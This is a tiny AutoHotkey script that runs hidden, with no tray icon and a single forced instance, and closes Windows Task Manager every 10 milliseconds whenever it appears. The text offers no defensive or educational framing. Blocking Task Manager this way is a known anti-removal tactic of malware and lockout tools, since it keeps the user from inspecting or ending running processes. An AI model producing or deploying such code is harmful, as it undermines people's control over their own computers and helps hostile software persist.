#Persistent
#SingleInstance Force
#NoTrayIcon

SetTimer, KILL, 10

KILL:
if WinExist("ahk_exe taskmgr.exe")
WinKill, ahk_exe taskmgr.exe
return